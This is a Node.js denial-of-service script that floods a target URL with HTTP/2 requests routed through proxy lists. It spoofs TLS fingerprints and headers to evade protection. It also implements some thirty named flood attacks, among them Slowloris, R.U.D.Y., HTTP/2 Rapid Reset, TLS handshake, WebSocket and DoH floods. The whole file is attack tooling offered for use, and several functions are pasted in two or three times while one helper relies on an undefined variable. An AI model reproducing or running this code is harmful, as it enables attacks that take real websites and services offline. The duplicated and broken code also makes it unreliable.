/**
 * layer7 L4 under dev
 */

const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const http = require("http");
const https = require("https");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 5) {
    console.log(`Usage: node mm.js URL TIME REQ_PER_SEC THREADS\nExample: node mm.js https://tls.mrrage.xyz 500 8 1`);
    process.exit();
}

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");
const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";

const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method";
const headers = {};

const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);

var proxyFile = "proxy.txt";
var proxies = readLines(proxyFile);
var userAgents = readLines("ua.txt");
var refList = readLines("ref.txt");

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5]
}

const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }

    console.clear();

    setTimeout(() => {
        process.exit(1);
    }, process.argv[3] * 1000);

} else {
    for (let i = 0; i < 10; i++) {
        setInterval(runFlooder, 0)
    }
}

class NetSocket {
    constructor() {}
    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
        const buffer = new Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true
        });

        connection.setTimeout(options.timeout * 10000);
        connection.setKeepAlive(true, 10000);
        connection.setNoDelay(true)

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randomCharacters(length) {
    output = ""
    for (let count = 0; count < length; count++) {
        output += randomElement(characters);
    }
    return output;
}

headers[":method"] = "GET";
headers[":path"] = parsedTarget.path;
headers["referer"] = randomElement(refList);
headers[":scheme"] = "https";
headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
headers["accept-language"] = "es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3";
headers["accept-encoding"] = "gzip, deflate, br";
headers["x-forwarded-proto"] = "https";
headers["cache-control"] = "no-cache, no-store,private, max-age=0, must-revalidate";
headers["sec-ch-ua-mobile"] = randomElement(["?0", "?1"]);
headers["sec-ch-ua-platform"] = randomElement(["Android", "iOS", "Linux", "macOS", "Windows"]);
headers["sec-fetch-dest"] = "document";
headers["sec-fetch-mode"] = "navigate";
headers["sec-fetch-site"] = "same-origin";
headers["upgrade-insecure-requests"] = "1";

const httpAttacks = [
    "HTTP GET Flood",
    "HTTP POST Flood",
    "HTTP HEAD Flood",
    "HTTP OPTIONS Flood",
    "HTTP PUSH Flood",
    "Random Query Flood (cache bypass)",
    "Recursive Page Load Flood",
    "HULK-style randomized flood",
    "Slowloris (slow header)",
    "R.U.D.Y. (slow POST)",
    "Slow Read attack",
    "HTTP Search Flood",
    "File Upload Flood",
    "File Download Flood",
    "Header Spoof Flood",
    "Overlong Header Attack",
    "Content-Type Abuse",
    "HTTP/1.1 Keep-Alive abuse",
    "HTTP Smuggling",
    "Multipath / Duplicate Parameter Abuse (e.g. ?id=1&id=2)"
];

const httpsTlsAttacks = [
    "HTTPS Flood (encrypted GET/POST)",
    "TLS Handshake Flood (CPU-heavy)",
    "SSL Renegotiation Flood",
    "HTTP/2 Stream Flood",
    "HTTP/2 Rapid Reset Attack",
    "HTTP/2 Ping Flood",
    "HEADERS/SETTINGS frame abuse"
];

const websocketAttacks = [
    "WebSocket Connection Flood",
    "WebSocket Message Spam Flood",
    "WebSocket Keepalive Abuse",
    "WebSocket Authentication Abuse"
];

const dohAttacks = [
    "DoH Flood (query abuse)",
    "Recursive DoH Abuse"
];

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    /** headers dynamic */
    headers[":authority"] = parsedTarget.host;
    headers[":path"] = parsedTarget.path;
    headers["user-agent"] = randomElement(userAgents);
    headers["x-forwarded-for"] = parsedProxy[0];
    headers["referer"] = randomElement(refList);
    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 15
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return

        connection.setKeepAlive(true, 60000);
        connection.setNoDelay(true)

        const settings = {
            enablePush: false,
            initialWindowSize: 1073741823
        };

        const tlsOptions = {
            port: 443,
            secure: true,
            ALPNProtocols: [
                "h2"
            ],
            ciphers: ciphers,
            sigalgs: sigalgs,
            requestCert: true,
            socket: connection,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            host: parsedTarget.host,
            rejectUnauthorized: false,
            clientCertEngine: "dynamic",
            secureOptions: secureOptions,
            secureContext: secureContext,
            servername: parsedTarget.host,
            secureProtocol: secureProtocol
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

        tlsConn.allowHalfOpen = true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60 * 1000);
        tlsConn.setMaxListeners(0);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: settings,
            maxSessionMemory: 3333,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn
        });

        client.setMaxListeners(0);
        client.settings(settings);

        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    headers["referer"] = "https://" + parsedTarget.host + parsedTarget.path;
                    const request = client.request(headers)

                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });

                    request.end();
                }
            }, 1000);
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return
        });
    });
}

const KillScript = () => process.exit(1);

setTimeout(KillScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});

// Function to perform HTTP GET Flood
function httpGetFlood() {
    const options = {
        host: parsedTarget.hostname,
        port: 80,
        path: parsedTarget.path,
        method: 'GET',
        headers: {
            'User-Agent': randomElement(userAgents),
            'Connection': 'Keep-Alive'
        }
    };

    const req = http.request(options, (res) => {
        res.on('data', (chunk) => {
            // Process data chunk
        });
    });

    req.on('error', (e) => {
        console.error(`Problem with request: ${e.message}`);
    });

    req.end();
}

// Function to perform HTTP POST Flood
function httpPostFlood() {
    const options = {
        host: parsedTarget.hostname,
        port: 80,
        path: parsedTarget.path,
        method: 'POST',
        headers: {
            'User-Agent': randomElement(userAgents),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': 0
        }
    };

    const req = http.request(options, (res) => {
        res.on('data', (chunk) => {
            // Process data chunk
        });
    });

    req.on('error', (e) => {
        console.error(`Problem with request: ${e.message}`);
    });

    req.end();
}

// Function to perform HTTP HEAD Flood
function httpHeadFlood() {
    const options = {
        host: parsedTarget.hostname,
        port: 80,
        path: parsedTarget.path,
        method: 'HEAD',
        headers: {
            'User-Agent': randomElement(userAgents),
            'Connection': 'Keep-Alive'
        }
    };

    const req = http.request(options, (res) => {
        res.on('data', (chunk) => {
            // Process data chunk
        });
    });

    req.on('error', (e) => {
        console.error(`Problem with request: ${e.message}`);
    });

    req.end();
}

// Function to perform HTTP OPTIONS Flood
function httpOptionsFlood() {
    const options = {
        host: parsedTarget.hostname,
        port: 80,
        path: parsedTarget.path,
        method: 'OPTIONS',
        headers: {
            'User-Agent': randomElement(userAgents),
            'Connection': 'Keep-Alive'
        }
    };

    const req = http.request(options, (res) => {
        res.on('data', (chunk) => {
            // Process data chunk
        });
    });

    req.on('error', (e) => {
        console.error(`Problem with request: ${e.message}`);
    });

    req.end();
}

// Function to perform HTTP PUSH Flood
function httpPushFlood() {
    const options = {
        host: parsedTarget.hostname,
        port: 80,
        path: parsedTarget.path,
        method: 'PUSH',
        headers: {
            'User-Agent': randomElement(userAgents),
            'Connection': 'Keep-Alive'
        }
    };

    const req = http.request(options, (res) => {
        res.on('data', (chunk) => {
            // Process data chunk
        });
    });

    req.on('error', (e) => {
        console.error(`Problem with request: ${e.message}`);
    });

    req.end();
}

// Function to perform Random Query Flood (cache bypass)
function randomQueryFlood() {
    const query = '?' + randomCharacters(10);
    const options = {
        host: parsedTarget.hostname,
        port: 80,
        path: parsedTarget.path + query,
        method: 'GET',
        headers: {
            'User-Agent': randomElement(userAgents),
            'Connection': 'Keep-Alive'
        }
    };

    const req = http.request(options, (res) => {
        res.on('data', (chunk) => {
            // Process data chunk
        });
    });

    req.on('error', (e) => {
        console.error(`Problem with request: ${e.message}`);
    });

    req.end();
}

// Function to perform Recursive Page Load Flood
function recursivePageLoadFlood() {
    const options = {
        host: parsedTarget.hostname,
        port: 80,
        path: parsedTarget.path,
        method: 'GET',
        headers: {
            'User-Agent': randomElement(userAgents),
            'Connection': 'Keep-Alive'
        }
    };

    const req = http.request(options, (res) => {
        res.on('data', (chunk) => {
            // Process data chunk
        });
    });

    req.on('error', (e) => {
        console.error(`Problem with request: ${e.message}`);
    });

    req.end();
}

// Function to perform HULK-style randomized flood
function hulkStyleFlood() {
    const options = {
        host: parsedTarget.hostname,
        port: 80,
        path: parsedTarget.path,
        method: 'POST',
        headers: {
            'User-Agent': randomElement(userAgents),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': 0
        }
    };

    const req = http.request(options, (res) => {
        res.on('data', (chunk) => {
            // Process data chunk
        });
    });

    req.on('error', (e) => {
        console.error(`Problem with request: ${e.message}`);
    });

    req.end();
}

// Function to perform Slowloris (slow header)
function slowlorisAttack() {
    const options = {
        host: parsedTarget.hostname,
        port: 80,
        path: parsedTarget.path,
        method: 'GET',
        headers: {
            'User-Agent': randomElement(userAgents),
            'Connection': 'Keep-Alive'
        }
    };

    const req = http.request(options, (res) => {
        res.on('data', (chunk) => {
            // Slow read by processing data slowly
            setTimeout(() => {
                console.log('Receiving data chunk');
            }, 1000); // Adjust the delay as needed
        });

        res.on('end', () => {
            console.log('Response ended');
            req.end();
        });
    });

    req.on('error', (e) => {
        console.error(`Problem with request: ${e.message}`);
    });

    // Send headers slowly
    req.write('GET ' + parsedTarget.path + ' HTTP/1.1\r\n');
    req.write('Host: ' + parsedTarget.hostname + '\r\n');
    req.write('User-Agent: ' + randomElement(userAgents) + '\r\n');
    req.write('Connection: Keep-Alive\r\n');
    req.write('\r\n');

    // Keep the connection open
    req.end();
}
// Function to perform R.U.D.Y. (slow POST)
function rudyAttack() {
    const options = {
        host: parsedTarget.hostname,
        port: 80,
        path: parsedTarget.path,
        method: 'POST',
        headers: {
            'User-Agent': randomElement(userAgents),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Transfer-Encoding': 'chunked'
        }
    };

    const req = http.request(options, (res) => {
        res.on('data', (chunk) => {
            // Process data chunk
        });
    });

    req.on('error', (e) => {
        console.error(`Problem with request: ${e.message}`);
    });

    req.write('0\r\n\r\n'); // Send an empty chunk to keep the connection open
    req.end();
}

// Function to perform Slow Read attack
function slowReadAttack() {
    const options = {
        host: parsedTarget.hostname,
        port: 80,
        path: parsedTarget.path,
        method: 'GET',
        headers: {
            'User-Agent': randomElement(userAgents),
            'Connection': 'Keep-Alive'
        }
    };

    const req = http.request(options, (res) => {
        res.on('data', (chunk) => {
            // Slow read by processing data slowly
            setTimeout(() => {
                console.log('Receiving data chunk');
            }, 1000);
        });
    });

    req.on('error', (e) => {
        console.error(`Problem with request: ${e.message}`);
    });

    req.end();
}

// Function to perform HTTP Search Flood
function httpSearchFlood() {
    const query = 'q=' + randomCharacters(10);
    const options = {
        host: parsedTarget.hostname,
        port: 80,
        path: parsedTarget.path + '?' + query,
        method: 'GET',
        headers: {
            'User-Agent': randomElement(userAgents),
            'Connection': 'Keep-Alive'
        }
    };

    const req = http.request(options, (res) => {
        res.on('data', (chunk) => {
            // Process data chunk
        });
    });

    req.on('error', (e) => {
        console.error(`Problem with request: ${e.message}`);
    });

    req.end();
}

// Function to perform File Upload Flood
function fileUploadFlood() {
    const options = {
        host: parsedTarget.hostname,
        port: 80,
        path: parsedTarget.path,
        method: 'POST',
        headers: {
            'User-Agent': randomElement(userAgents),
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW'
        }
    };

    const req = http.request(options, (res) => {
        res.on('data', (chunk) => {
            // Process data chunk
        });
    });

    req.on('error', (e) => {
        console.error(`Problem with request: ${e.message}`);
    });

    req.end();
}

// Function to perform File Download Flood
function fileDownloadFlood() {
    const options = {
        host: parsedTarget.hostname,
        port: 80,
        path: parsedTarget.path,
        method: 'GET',
        headers: {
            'User-Agent': randomElement(userAgents),
            'Connection': 'Keep-Alive'
        }
    };

    const req = http.request(options, (res) => {
        res.on('data', (chunk) => {
            // Process data chunk
        });
    });

    req.on('error', (e) => {
        console.error(`Problem with request: ${e.message}`);
    });

    req.end();
}

// Function to perform Header Spoof Flood
function headerSpoofFlood() {
    const options = {
        host: parsedTarget.hostname,
        port: 80,
        path: parsedTarget.path,
        method: 'GET',
        headers: {
            'User-Agent': randomElement(userAgents),
            'X-Forwarded-For': '192.168.1.1',
            'Connection': 'Keep-Alive'
        }
    };

    const req = http.request(options, (res) => {
        res.on('data', (chunk) => {
            // Process data chunk
        });
    });

    req.on('error', (e) => {
        console.error(`Problem with request: ${e.message}`);
    });

    req.end();
}

// Function to perform Overlong Header Attack
function overlongHeaderAttack() {
    const options = {
        host: parsedTarget.hostname,
        port: 80,
        path: parsedTarget.path,
        method: 'GET',
        headers: {
            'User-Agent': randomElement(userAgents),
            'Connection': 'Keep-Alive',
            'Custom-Header': 'A'.repeat(1000) // Overlong header value
        }
    };

    const req = http.request(options, (res) => {
        res.on('data', (chunk) => {
            // Process data chunk
        });
    });

    req.on('error', (e) => {
        console.error(`Problem with request: ${e.message}`);
    });

    req.end();
}

// Function to perform Content-Type Abuse
function contentTypeAbuse() {
    const options = {
        host: parsedTarget.hostname,
        port: 80,
        path: parsedTarget.path,
        method: 'POST',
        headers: {
            'User-Agent': randomElement(userAgents),
            'Content-Type': 'application/json; charset=UTF-8',
            'Transfer-Encoding': 'chunked'
        }
    };

    const req = http.request(options, (res) => {
        res.on('data', (chunk) => {
            // Process data chunk
        });
    });

    req.on('error', (e) => {
        console.error(`Problem with request: ${e.message}`);
    });

    req.write('0\r\n\r\n'); // Send an empty chunk to keep the connection open
    req.end();
}

// Function to perform HTTP/1.1 Keep-Alive abuse
function keepAliveAbuse() {
    const options = {
        host: parsedTarget.hostname,
        port: 80,
        path: parsedTarget.path,
        method: 'GET',
        headers: {
            'User-Agent': randomElement(userAgents),
            'Connection': 'Keep-Alive'
        }
    };

    const req = http.request(options, (res) => {
        res.on('data', (chunk) => {
            // Process data chunk
        });
    });

    req.on('error', (e) => {
        console.error(`Problem with request: ${e.message}`);
    });

    req.end();
}

// Function to perform HTTP Smuggling
function httpSmuggling() {
    const options = {
        host: parsedTarget.hostname,
        port: 80,
        path: parsedTarget.path,
        method: 'POST',
        headers: {
            'User-Agent': randomElement(userAgents),
            'Content-Length': 0,
            'Transfer-Encoding': 'chunked'
        }
    };

    const req = http.request(options, (res) => {
        res.on('data', (chunk) => {
            // Process data chunk
        });
    });

    req.on('error', (e) => {
        console.error(`Problem with request: ${e.message}`);
    });

    req.write('0\r\n\r\n'); // Send an empty chunk to keep the connection open
    req.end();
}

// Function to perform Multipath / Duplicate Parameter Abuse
function multipathAbuse() {
    const query = 'id=1&id=2';
    const options = {
        host: parsedTarget.hostname,
        port: 80,
        path: parsedTarget.path + '?' + query,
        method: 'GET',
        headers: {
            'User-Agent': randomElement(userAgents),
            'Connection': 'Keep-Alive'
        }
    };

    const req = http.request(options, (res) => {
        res.on('data', (chunk) => {
            // Process data chunk
        });
    });

    req.on('error', (e) => {
        console.error(`Problem with request: ${e.message}`);
    });

    req.end();
}

// Function to perform HTTPS Flood (encrypted GET/POST)
function httpsFlood() {
    const options = {
        host: parsedTarget.hostname,
        port: 443,
        path: parsedTarget.path,
        method: 'GET',
        headers: {
            'User-Agent': randomElement(userAgents),
            'Connection': 'Keep-Alive'
        }
    };

    const req = https.request(options, (res) => {
        res.on('data', (chunk) => {
            // Process data chunk
        });
    });

    req.on('error', (e) => {
        console.error(`Problem with request: ${e.message}`);
    });

    req.end();
}

// Function to perform TLS Handshake Flood (CPU-heavy)
function tlsHandshakeFlood() {
    const options = {
        host: parsedTarget.hostname,
        port: 443,
        path: parsedTarget.path,
        method: 'GET',
        headers: {
            'User-Agent': randomElement(userAgents),
            'Connection': 'Keep-Alive'
        }
    };

    const req = https.request(options, (res) => {
        res.on('data', (chunk) => {
            // Process data chunk
        });

        res.on('end', () => {
            console.log('Response ended');
        });
    });

    req.on('error', (e) => {
        console.error(`Problem with request: ${e.message}`);
    });

    // Initiate the request to start the TLS handshake
    req.end();
}

// Example usage of the TLS Handshake Flood attack
function performTlsHandshakeFlood() {
    for (let i = 0; i < 100; i++) { // Adjust the number of requests as needed
        tlsHandshakeFlood();
    }
}

performTlsHandshakeFlood();

// Function to perform SSL Renegotiation Flood
function sslRenegotiationFlood() {
    const options = {
        host: parsedTarget.hostname,
        port: 443,
        path: parsedTarget.path,
        method: 'GET',
        headers: {
            'User-Agent': randomElement(userAgents),
            'Connection': 'Keep-Alive'
        }
    };

    const req = https.request(options, (res) => {
        res.on('data', (chunk) => {
            // Process data chunk
        });
    });

    req.on('error', (e) => {
        console.error(`Problem with request: ${e.message}`);
    });

    req.end();
}

// Function to perform HTTP/2 Stream Flood
function http2StreamFlood() {
    const client = http2.connect(`https://${parsedTarget.hostname}`);

    client.on('connect', () => {
        for (let i = 0; i < 10; i++) {
            const req = client.request({
                ':path': parsedTarget.path,
                ':method': 'GET',
                'user-agent': randomElement(userAgents)
            });

            req.on('response', (headers, flags) => {
                req.close();
            });

            req.end();
        }
    });

    client.on('error', (err) => {
        console.error(`Error: ${err.message}`);
    });
}

// Function to perform HTTP/2 Rapid Reset Attack
function http2RapidResetAttack() {
    const client = http2.connect(`https://${parsedTarget.hostname}`);

    client.on('connect', () => {
        for (let i = 0; i < 10; i++) {
            const req = client.request({
                ':path': parsedTarget.path,
                ':method': 'GET',
                'user-agent': randomElement(userAgents)
            });

            req.on('response', (headers, flags) => {
                req.close();
            });

            req.end();
        }
    });

    client.on('error', (err) => {
        console.error(`Error: ${err.message}`);
    });
}

// Function to perform HTTP/2 Ping Flood
function http2PingFlood() {
    const client = http2.connect(`https://${parsedTarget.hostname}`);

    client.on('connect', () => {
        for (let i = 0; i < 10; i++) {
            client.ping();
        }
    });

    client.on('error', (err) => {
        console.error(`Error: ${err.message}`);
    });
}

// Function to perform HEADERS/SETTINGS frame abuse
function headersSettingsFrameAbuse() {
    const client = http2.connect(`https://${parsedTarget.hostname}`);

    client.on('connect', () => {
        const settings = {
            enablePush: false,
            initialWindowSize: 1073741823
        };

        client.settings(settings);
    });

    client.on('error', (err) => {
        console.error(`Error: ${err.message}`);
    });
}

// Function to perform WebSocket Connection Flood
function websocketConnectionFlood() {
    const WebSocket = require('ws');
    const ws = new WebSocket(`wss://${parsedTarget.hostname}${parsedTarget.path}`);

    ws.on('open', () => {
        console.log('WebSocket connection opened');
    });

    ws.on('error', (err) => {
        console.error(`WebSocket error: ${err.message}`);
    });
}

// Function to perform WebSocket Message Spam Flood
function websocketMessageSpamFlood() {
    const WebSocket = require('ws');
    const ws = new WebSocket(`wss://${parsedTarget.hostname}${parsedTarget.path}`);

    ws.on('open', () => {
        for (let i = 0; i < 10; i++) {
            ws.send('Spam message');
        }
    });

    ws.on('error', (err) => {
        console.error(`WebSocket error: ${err.message}`);
    });
}

// Function to perform WebSocket Keepalive Abuse
function websocketKeepaliveAbuse() {
    const WebSocket = require('ws');
    const ws = new WebSocket(`wss://${parsedTarget.hostname}${parsedTarget.path}`);

    ws.on('open', () => {
        ws.ping();
    });

    ws.on('error', (err) => {
        console.error(`WebSocket error: ${err.message}`);
    });
}

// Function to perform WebSocket Authentication Abuse
function websocketAuthenticationAbuse() {
    const WebSocket = require('ws');
    const ws = new WebSocket(`wss://${parsedTarget.hostname}${parsedTarget.path}`, {
        headers: {
            'Authorization': 'Basic ' + Buffer.from('user:pass').toString('base64')
        }
    });

    ws.on('open', () => {
        console.log('WebSocket connection opened with authentication');
    });

    ws.on('error', (err) => {
        console.error(`WebSocket error: ${err.message}`);
    });
}

// Function to perform DoH Flood (query abuse)
function dohFlood() {
    const dns = require('dns').promises;
    const query = randomCharacters(10);

    dns.resolve(query, {
        type: 'A',
        server: parsedTarget.hostname
    })
    .catch(err => {
        console.error(`DoH error: ${err.message}`);
    });
}

// Function to perform Recursive DoH Abuse
function recursiveDohAbuse() {
    const dns = require('dns').promises;
    const query = randomCharacters(10);

    dns.resolve(query, {
        type: 'A',
        server: parsedTarget.hostname
    })
    .then(answer => {
        dns.resolve(answer[0], {
            type: 'A',
            server: parsedTarget.hostname
        })
        .catch(err => {
            console.error(`Recursive DoH error: ${err.message}`);
        });
    })
    .catch(err => {
        console.error(`Recursive DoH error: ${err.message}`);
    });
}

// Example usage of the attack functions
function performAttacks() {
    // Choose which attacks to perform
    const attacksToPerform = [
        httpGetFlood,
        httpPostFlood,
        httpHeadFlood,
        httpOptionsFlood,
        httpPushFlood,
        randomQueryFlood,
        recursivePageLoadFlood,
        hulkStyleFlood,
        slowlorisAttack,
        rudyAttack,
        slowReadAttack,
        httpSearchFlood,
        fileUploadFlood,
        fileDownloadFlood,
        headerSpoofFlood,
        overlongHeaderAttack,
        contentTypeAbuse,
        keepAliveAbuse,
        httpSmuggling,
        multipathAbuse,
        httpsFlood,
        tlsHandshakeFlood,
        sslRenegotiationFlood,
        http2StreamFlood,
        http2RapidResetAttack,
        http2PingFlood,
        headersSettingsFrameAbuse,
        websocketConnectionFlood,
        websocketMessageSpamFlood,
        websocketKeepaliveAbuse,
        websocketAuthenticationAbuse,
        dohFlood,
        recursiveDohAbuse
    ];

    // Perform each attack
    attacksToPerform.forEach(attack => {
        attack();
    });
}

performAttacks();

// Function to perform HTTP/2 Stream Flood
function http2StreamFlood() {
    const client = http2.connect(`https://${parsedTarget.hostname}`);

    client.on('connect', () => {
        for (let i = 0; i < 10; i++) {
            const req = client.request({
                ':path': parsedTarget.path,
                ':method': 'GET',
                'user-agent': randomElement(userAgents)
            });

            req.on('response', (headers, flags) => {
                req.close();
            });

            req.end();
        }
    });

    client.on('error', (err) => {
        console.error(`Error: ${err.message}`);
    });
}

// Function to perform HTTP/2 Rapid Reset Attack
function http2RapidResetAttack() {
    const client = http2.connect(`https://${parsedTarget.hostname}`);

    client.on('connect', () => {
        for (let i = 0; i < 10; i++) {
            const req = client.request({
                ':path': parsedTarget.path,
                ':method': 'GET',
                'user-agent': randomElement(userAgents)
            });

            req.on('response', (headers, flags) => {
                req.close();
            });

            req.end();
        }
    });

    client.on('error', (err) => {
        console.error(`Error: ${err.message}`);
    });
}

// Function to perform HTTP/2 Ping Flood
function http2PingFlood() {
    const client = http2.connect(`https://${parsedTarget.hostname}`);

    client.on('connect', () => {
        for (let i = 0; i < 10; i++) {
            client.ping();
        }
    });

    client.on('error', (err) => {
        console.error(`Error: ${err.message}`);
    });
}

// Function to perform HEADERS/SETTINGS frame abuse
function headersSettingsFrameAbuse() {
    const client = http2.connect(`https://${parsedTarget.hostname}`);

    client.on('connect', () => {
        const settings = {
            enablePush: false,
            initialWindowSize: 1073741823
        };

        client.settings(settings);
    });

    client.on('error', (err) => {
        console.error(`Error: ${err.message}`);
    });
}

// Function to perform WebSocket Connection Flood
function websocketConnectionFlood() {
    const WebSocket = require('ws');
    const ws = new WebSocket(`wss://${parsedTarget.hostname}${parsedTarget.path}`);

    ws.on('open', () => {
        console.log('WebSocket connection opened');
    });

    ws.on('error', (err) => {
        console.error(`WebSocket error: ${err.message}`);
    });
}

// Function to perform WebSocket Message Spam Flood
function websocketMessageSpamFlood() {
    const WebSocket = require('ws');
    const ws = new WebSocket(`wss://${parsedTarget.hostname}${parsedTarget.path}`);

    ws.on('open', () => {
        for (let i = 0; i < 10; i++) {
            ws.send('Spam message');
        }
    });

    ws.on('error', (err) => {
        console.error(`WebSocket error: ${err.message}`);
    });
}

// Function to perform WebSocket Keepalive Abuse
function websocketKeepaliveAbuse() {
    const WebSocket = require('ws');
    const ws = new WebSocket(`wss://${parsedTarget.hostname}${parsedTarget.path}`);

    ws.on('open', () => {
        ws.ping();
    });

    ws.on('error', (err) => {
        console.error(`WebSocket error: ${err.message}`);
    });
}

// Function to perform WebSocket Authentication Abuse
function websocketAuthenticationAbuse() {
    const WebSocket = require('ws');
    const ws = new WebSocket(`wss://${parsedTarget.hostname}${parsedTarget.path}`, {
        headers: {
            'Authorization': 'Basic ' + Buffer.from('user:pass').toString('base64')
        }
    });

    ws.on('open', () => {
        console.log('WebSocket connection opened with authentication');
    });

    ws.on('error', (err) => {
        console.error(`WebSocket error: ${err.message}`);
    });
}

// Function to perform DoH Flood (query abuse)
function dohFlood() {
    const dns = require('dns').promises;
    const query = randomCharacters(10);

    dns.resolve(query, {
        type: 'A',
        server: parsedTarget.hostname
    })
    .catch(err => {
        console.error(`DoH error: ${err.message}`);
    });
}

// Function to perform Recursive DoH Abuse
function recursiveDohAbuse() {
    const dns = require('dns').promises;
    const query = randomCharacters(10);

    dns.resolve(query, {
        type: 'A',
        server: parsedTarget.hostname
    })
    .then(answer => {
        dns.resolve(answer[0], {
            type: 'A',
            server: parsedTarget.hostname
        })
        .catch(err => {
            console.error(`Recursive DoH error: ${err.message}`);
        });
    })
    .catch(err => {
        console.error(`Recursive DoH error: ${err.message}`);
    });
}

// Function to perform HTTP/2 Stream Flood
function http2StreamFlood() {
    const client = http2.connect(`https://${parsedTarget.hostname}`);

    client.on('connect', () => {
        for (let i = 0; i < 10; i++) {
            const req = client.request({
                ':path': parsedTarget.path,
                ':method': 'GET',
                'user-agent': randomElement(userAgents)
            });

            req.on('response', (headers, flags) => {
                req.close();
            });

            req.end();
        }
    });

    client.on('error', (err) => {
        console.error(`Error: ${err.message}`);
    });
}

// Function to perform HTTP/2 Rapid Reset Attack
function http2RapidResetAttack() {
    const client = http2.connect(`https://${parsedTarget.hostname}`);

    client.on('connect', () => {
        for (let i = 0; i < 10; i++) {
            const req = client.request({
                ':path': parsedTarget.path,
                ':method': 'GET',
                'user-agent': randomElement(userAgents)
            });

            req.on('response', (headers, flags) => {
                req.close();
            });

            req.end();
        }
    });

    client.on('error', (err) => {
        console.error(`Error: ${err.message}`);
    });
}

// Function to perform HTTP/2 Ping Flood
function http2PingFlood() {
    const client = http2.connect(`https://${parsedTarget.hostname}`);

    client.on('connect', () => {
        for (let i = 0; i < 10; i++) {
            client.ping();
        }
    });

    client.on('error', (err) => {
        console.error(`Error: ${err.message}`);
    });
}

// Function to perform HEADERS/SETTINGS frame abuse
function headersSettingsFrameAbuse() {
    const client = http2.connect(`https://${parsedTarget.hostname}`);

    client.on('connect', () => {
        const settings = {
            enablePush: false,
            initialWindowSize: 1073741823
        };

        client.settings(settings);
    });

    client.on('error', (err) => {
        console.error(`Error: ${err.message}`);
    });
}

// Function to perform WebSocket Connection Flood
function websocketConnectionFlood() {
    const WebSocket = require('ws');
    const ws = new WebSocket(`wss://${parsedTarget.hostname}${parsedTarget.path}`);

    ws.on('open', () => {
        console.log('WebSocket connection opened');
    });

    ws.on('error', (err) => {
        console.error(`WebSocket error: ${err.message}`);
    });
}

